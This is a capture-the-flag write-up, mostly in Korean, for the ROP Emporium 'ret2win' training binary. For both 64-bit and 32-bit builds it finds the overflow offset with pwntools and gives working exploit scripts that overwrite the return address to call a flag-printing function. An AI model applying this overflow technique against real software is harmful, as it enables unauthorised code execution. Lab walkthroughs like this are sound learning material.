# [ret2win](https://ropemporium.com/challenge/ret2win.html)
<br />

**Discription:**
> Locate a method that you want to call within the binary.
Call it by overwriting a saved return address on the stack.
> 
<br />
<br />

# x86_64

**Binary Protections:**
```yaml
[*] '/home/kali/pico/ret2win'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
<br />

```yaml
pwndbg> disass ret2win
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:     push   rbp
   0x0000000000400757 <+1>:     mov    rbp,rsp
   0x000000000040075a <+4>:     mov    edi,0x400926
   0x000000000040075f <+9>:     call   0x400550 <puts@plt>
   0x0000000000400764 <+14>:    mov    edi,0x400943
   0x0000000000400769 <+19>:    call   0x400560 <system@plt>
   0x000000000040076e <+24>:    nop
   0x000000000040076f <+25>:    pop    rbp
   0x0000000000400770 <+26>:    ret
pwndbg> x/s 0x400943
0x400943:       "/bin/cat flag.txt"
```
`ret2win`은 `system`을 호출하고, 인자로 `"/bin/cat flag.txt"`를 사용하는 것을 알 수 있습니다. 

```yaml
$ python3 -q
>>> from pwn import *
>>> p = process("./ret2win")
[+] Starting local process './ret2win': pid 848
>>> p.sendline(cyclic(200, n=8))
>>> p.wait()
[*] Process './ret2win' stopped with exit code -11 (SIGSEGV) (pid 848)
>>> Corefile("./core.848")
[+] Parsing corefile...: Done
[*] '/home/kali/pico/core.848'
    Arch:      amd64-64-little
    RIP:       0x400755
    RSP:       0x7fffadd7a4d8
    Exe:       '/home/kali/pico/ret2win' (0x400000)
    Fault:     0x6161616161616166
Corefile('/home/kali/pico/core.848')
>>> cyclic_find(0x6161616161616166, n=8)
40
```
오프셋은 40 입니다.

<br />

```python
from pwn import *

context.log_level = "error"
context.arch = "amd64"

p = process("./ret2win")

ret2win = 0x400756
str = 0x00400943

pay = flat({40:ret2win}, str)

p.sendline(pay)
p.interactive()
```
```bash
$ python3 test.py
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
$
```

<br />
<br />

# x86

**Binary Protections:**
```yaml
[*] '/home/kali/pico/ret2win32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

<br />
<br />

```yaml
$ r2 ret2win32
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x08048430]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000006e0 0x080486e0 23  24   .rodata ascii ret2win by ROP Emporium
1   0x000006f8 0x080486f8 4   5    .rodata ascii x86\n
2   0x000006fd 0x080486fd 8   9    .rodata ascii \nExiting
3   0x00000708 0x08048708 95  96   .rodata ascii For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
4   0x00000768 0x08048768 29  30   .rodata ascii What could possibly go wrong?
5   0x00000788 0x08048788 95  96   .rodata ascii You there, may I have your input please? And don't worry about null bytes, we're using read()!\n
6   0x000007eb 0x080487eb 10  11   .rodata ascii Thank you!
7   0x000007f6 0x080487f6 28  29   .rodata ascii Well done! Here's your flag:
8   0x00000813 0x08048813 17  18   .rodata ascii /bin/cat flag.txt
```
위 명령어로 `"/bin/cat flag.txt"`의 주소는 `0x08048813` 것을 알 수 있습니다.

```yaml
$ python3 -q
>>> from pwn import *
>>>
>>> p = process("./ret2win32")
[+] Starting local process './ret2win32': pid 2481
>>> p.sendline(cyclic(100))
>>> p.wait()
[*] Process './ret2win32' stopped with exit code -11 (SIGSEGV) (pid 2481)
>>> Corefile("./core.2481")
[+] Parsing corefile...: Done
[*] '/home/kali/pico/core.2481'
    Arch:      i386-32-little
    EIP:       0x6161616c
    ESP:       0xff80e1d0
    Exe:       '/home/kali/pico/ret2win32' (0x8048000)
    Fault:     0x6161616c
Corefile('/home/kali/pico/core.2481')
>>> cyclic_find(0x6161616c)
44
```
오프셋은 44 입니다.

<br />

```python
from pwn import *

context.log_level = "error"
context.arch = "x86"

e = ELF("./ret2win32", checksec=False)
p = e.process()

ret2win = e.sym["ret2win"]
flag = 0x08048813

pay = flat({44:ret2win}, flag)

p.sendline(pay)
p.interactive()
```
```bash
$ python3 test.py
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
$
``` 
test
